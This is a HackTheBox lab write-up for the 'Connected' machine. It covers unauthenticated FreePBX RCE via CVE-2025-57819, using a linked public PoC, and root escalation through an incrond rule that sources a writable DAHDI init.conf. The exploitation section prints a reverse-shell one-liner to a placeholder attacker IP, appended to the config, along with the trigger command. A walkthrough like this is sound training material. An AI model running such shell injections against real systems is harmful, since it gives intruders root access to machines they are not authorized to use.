---
title: "FreePBX Auth Bypass to RCE & Incron Privesc: CVE-2025-57819 Writeup (HTB Connected)"
date: "2026-06-09"
tags: ["htb", "web-exploitation", "writeup", "linux-privesc"]
description: "Walkthrough of HackTheBox Connected — unauthenticated FreePBX RCE via CVE-2025-57819, followed by privilege escalation via writable DAHDI init.conf sourced by an incrond-triggered root script."
slug: "htb-connected"
---

## Overview

**Machine:** Connected  
**Difficulty:** Easy  
**OS:** Linux (CentOS 7)  
**Key CVE:** CVE-2025-57819

This machine involved exploiting an unauthenticated SQL injection vulnerability in FreePBX's Endpoint Manager module to gain a shell as the `asterisk` user, then escalating to root by injecting a reverse shell into a configuration file sourced by a privileged script triggered via `incrond`.

## Enumeration

Initial Nmap scanning revealed three open ports:

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
```

Port 80 redirected to `http://connected.htb/`. Browsing to the site revealed a FreePBX interface. Version fingerprinting identified FreePBX 16 with an unpatched Endpoint Manager module below the fixed version `16.0.89` — the patched threshold for CVE-2025-57819.

## Foothold — CVE-2025-57819

CVE-2025-57819 is a critical unauthenticated vulnerability in FreePBX's Endpoint Manager module affecting versions 15, 16, and 17 below patched releases (`15.0.66`, `16.0.89`, `17.0.3`). Insufficient sanitization of user-supplied input allows an unauthenticated attacker to reach SQL injection flows, enabling arbitrary database manipulation and remote code execution. It carries a CVSS v3.1 score of 9.8 and was added to the CISA KEV catalog following active exploitation in the wild.

Exploitation used the [watchTowr public PoC](https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819), which chains the authentication bypass with SQL injection to achieve RCE, returning a shell as `uid=999(asterisk)`.

## Privilege Escalation — incrond + DAHDI init.conf

### Identifying incrond Rules

`incrond` was running as root, monitoring filesystem paths for write events. Reading `/etc/incron.d/*` revealed:

```
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

Writing to `/var/spool/asterisk/sysadmin/dahdi_restart` triggers `/usr/sbin/sysadmin_dahdi_restart` as root.

### Identifying the Writable Config

```bash
find /etc -writable 2>/dev/null
# Notable: /etc/dahdi/init.conf
```

The `asterisk` user owned `/etc/dahdi/`, including `init.conf`. Inspecting `/usr/sbin/sysadmin_dahdi_restart` confirmed it sources `init.conf` as a shell script — any commands present are executed as root.

### Exploitation

A reverse shell was appended to `init.conf`:

```bash
echo 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1" &' >> /etc/dahdi/init.conf
```

With a listener running, the incrond trigger was fired:

```bash
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

`incrond` detected the `IN_CLOSE_WRITE` event, executed `sysadmin_dahdi_restart` as root, which sourced the modified `init.conf` and returned a root shell.

```bash
whoami
# root
cat /root/root.txt
```

## Lessons Learned

- FreePBX module versions matter independently of the core platform — CVE-2025-57819 only affects the Endpoint Manager module, so always enumerate individual module versions during web recon.
- `incrond` is a commonly overlooked privesc vector. Any root-owned incron rule that triggers a script sourcing a user-writable config file is exploitable.
- When one attack path stalls, step back and enumerate writable files broadly rather than continuing to push the same vector.
- Always check ownership of `/etc` subdirectories — config files sourced by privileged restart scripts are a reliable privesc primitive.